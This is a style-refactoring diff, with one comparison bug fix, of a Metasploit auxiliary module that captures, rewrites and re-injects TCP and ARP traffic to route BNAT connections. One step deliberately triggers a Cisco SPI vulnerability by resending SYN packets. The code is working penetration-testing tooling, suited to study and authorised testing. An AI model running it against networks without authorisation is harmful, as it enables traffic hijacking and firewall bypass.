@@ -7,55 +7,54 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'BNAT Router',
-      'Description'  => %q{
+      'Name' => 'BNAT Router',
+      'Description' => %q{
           This module will properly route BNAT traffic and allow for connections to be
         established to machines on ports which might not otherwise be accessible.},
-      'Author'       =>
-        [
-            'bannedit',
-            'Jonathan Claudius',
-        ],
-      'License'      => MSF_LICENSE,
-      'References'   =>
-        [
-          [ 'URL', 'https://github.com/claudijd/bnat' ],
-          [ 'URL', 'http://www.slideshare.net/claudijd/dc-skytalk-bnat-hijacking-repairing-broken-communication-channels']
-        ]
+      'Author' => [
+        'bannedit',
+        'Jonathan Claudius',
+      ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['URL', 'https://github.com/claudijd/bnat' ],
+        ['URL', 'http://www.slideshare.net/claudijd/dc-skytalk-bnat-hijacking-repairing-broken-communication-channels']
+      ]
     )
     register_options(
-        [
-          OptString.new('OUTINF',    [true, 'The external interface connected to the internet', 'eth1']),
-          OptString.new('ININF',     [true, 'The internal interface connected to the network', 'eth2']),
-          OptString.new('CLIENTIP',  [true, 'The ip of the client behind the BNAT router', '192.168.3.2']),
-          OptString.new('SERVERIP',  [true, 'The ip of the server you are targeting', '1.1.2.1']),
-          OptString.new('BNATIP',    [true, 'The ip of the bnat response you are getting', '1.1.2.2']),
-        ])
+      [
+        OptString.new('OUTINF', [true, 'The external interface connected to the internet', 'eth1']),
+        OptString.new('ININF', [true, 'The internal interface connected to the network', 'eth2']),
+        OptString.new('CLIENTIP', [true, 'The ip of the client behind the BNAT router', '192.168.3.2']),
+        OptString.new('SERVERIP', [true, 'The ip of the server you are targeting', '1.1.2.1']),
+        OptString.new('BNATIP', [true, 'The ip of the bnat response you are getting', '1.1.2.2']),
+      ]
+    )
   end
 
   def run
     clientip = datastore['CLIENTIP']
     serverip = datastore['SERVERIP']
-    bnatip =   datastore['BNATIP']
-    outint =   datastore['OUTINF']
-    inint =    datastore['ININF']
+    bnatip = datastore['BNATIP']
+    outint = datastore['OUTINF']
+    inint = datastore['ININF']
 
-    clientmac = arp2(clientip,inint)
+    clientmac = arp2(clientip, inint)
     print_line("Obtained Client MAC: #{clientmac}")
-    servermac = arp2(serverip,outint)
+    servermac = arp2(serverip, outint)
     print_line("Obtained Server MAC: #{servermac}")
-    bnatmac = arp2(bnatip,outint)
+    bnatmac = arp2(bnatip, outint)
     print_line("Obtained BNAT MAC: #{bnatmac}\n\n")
 
     # Create Interface Specific Configs
-    outconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{outint}").config
-    inconfig =  PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{inint}").config
+    outconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig(":#{outint}")).config
+    inconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig(":#{inint}")).config
 
     # Set Captures for Traffic coming from Outside and from Inside respectively
-    outpcap = PacketFu::Capture.new( :iface => "#{outint}", :start => true, :filter => "tcp and src #{bnatip}" )
+    outpcap = PacketFu::Capture.new(iface: outint.to_s, start: true, filter: "tcp and src #{bnatip}")
     print_line("Now listening on #{outint}...")
 
-    inpcap = PacketFu::Capture.new( :iface => "#{inint}", :start => true, :filter => "tcp and src #{clientip} and dst #{serverip}" )
+    inpcap = PacketFu::Capture.new(iface: inint.to_s, start: true, filter: "tcp and src #{clientip} and dst #{serverip}")
     print_line("Now listening on #{inint}...\n\n")
 
     # Start Thread from Outside Processing
@@ -65,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
           packet = PacketFu::Packet.parse(pkt)
 
           # Build a shell packet that will never hit the wire as a hack to get desired mac's
-          shell_pkt = PacketFu::TCPPacket.new(:config => inconfig, :timeout => 0.1, :flavor => "Windows")
+          shell_pkt = PacketFu::TCPPacket.new(config: inconfig, timeout: 0.1, flavor: 'Windows')
           shell_pkt.ip_daddr = clientip
           shell_pkt.recalc
 
@@ -75,9 +74,9 @@ class MetasploitModule < Msf::Auxiliary
           packet.eth_saddr = shell_pkt.eth_saddr
           packet.eth_daddr = clientmac
           packet.recalc
-          inj = PacketFu::Inject.new( :iface => "#{inint}", :config => inconfig )
-          inj.a2w(:array => [packet.to_s])
-          print_status("inpacket processed")
+          inj = PacketFu::Inject.new(iface: inint.to_s, config: inconfig)
+          inj.a2w(array: [packet.to_s])
+          print_status('inpacket processed')
         end
       end
     end
@@ -97,23 +96,23 @@ class MetasploitModule < Msf::Auxiliary
           end
 
           # Build a shell packet that will never hit the wire as a hack to get desired mac's
-          shell_pkt = PacketFu::TCPPacket.new(:config=>outconfig, :timeout=> 0.1, :flavor=>"Windows")
+          shell_pkt = PacketFu::TCPPacket.new(config: outconfig, timeout: 0.1, flavor: 'Windows')
           shell_pkt.ip_daddr = serverip
           shell_pkt.recalc
 
           # Mangle Received Packet and Drop on the Wire
           packet.eth_saddr = shell_pkt.eth_saddr
-          packet.ip_saddr=shell_pkt.ip_saddr
+          packet.ip_saddr = shell_pkt.ip_saddr
           packet.recalc
-          inj = PacketFu::Inject.new( :iface => "#{outint}", :config =>outconfig )
-          inj.a2w(:array => [packet.to_s])
+          inj = PacketFu::Inject.new(iface: outint.to_s, config: outconfig)
+          inj.a2w(array: [packet.to_s])
 
           # Trigger Cisco SPI Vulnerability by Double-tapping the SYN
           if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
             select(nil, nil, nil, 0.75)
-            inj.a2w(:array => [packet.to_s])
+            inj.a2w(array: [packet.to_s])
           end
-          print_status("outpacket processed")
+          print_status('outpacket processed')
         end
       end
     end
@@ -121,23 +120,23 @@ class MetasploitModule < Msf::Auxiliary
     fromin.join
   end
 
-  def arp2(target_ip,int)
-    config = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{int}").config
-    arp_pkt = PacketFu::ARPPacket.new(:flavor => "Windows")
+  def arp2(target_ip, int)
+    config = PacketFu::Config.new(PacketFu::Utils.ifconfig(":#{int}")).config
+    arp_pkt = PacketFu::ARPPacket.new(flavor: 'Windows')
     arp_pkt.eth_saddr = arp_pkt.arp_saddr_mac = config[:eth_saddr]
-    arp_pkt.eth_daddr = "ff:ff:ff:ff:ff:ff"
-    arp_pkt.arp_daddr_mac = "00:00:00:00:00:00"
+    arp_pkt.eth_daddr = 'ff:ff:ff:ff:ff:ff'
+    arp_pkt.arp_daddr_mac = '00:00:00:00:00:00'
     arp_pkt.arp_saddr_ip = config[:ip_saddr]
     arp_pkt.arp_daddr_ip = target_ip
-    cap = PacketFu::Capture.new(:iface => config[:iface], :start => true, :filter => "arp src #{target_ip} and ether dst #{arp_pkt.eth_saddr}")
-    injarp = PacketFu::Inject.new(:iface => config[:iface])
-    injarp.a2w(:array => [arp_pkt.to_s])
+    cap = PacketFu::Capture.new(iface: config[:iface], start: true, filter: "arp src #{target_ip} and ether dst #{arp_pkt.eth_saddr}")
+    injarp = PacketFu::Inject.new(iface: config[:iface])
+    injarp.a2w(array: [arp_pkt.to_s])
     target_mac = nil
 
     while target_mac.nil?
       if cap.save > 0
         arp_response = PacketFu::Packet.parse(cap.array[0])
-        target_mac = arp_response.arp_saddr_mac if arp_response.arp_saddr_ip = target_ip
+        target_mac = arp_response.arp_saddr_mac if arp_response.arp_saddr_ip == target_ip
       end
       select(nil, nil, nil, 0.1) # Check for a response ten times per second.
     end
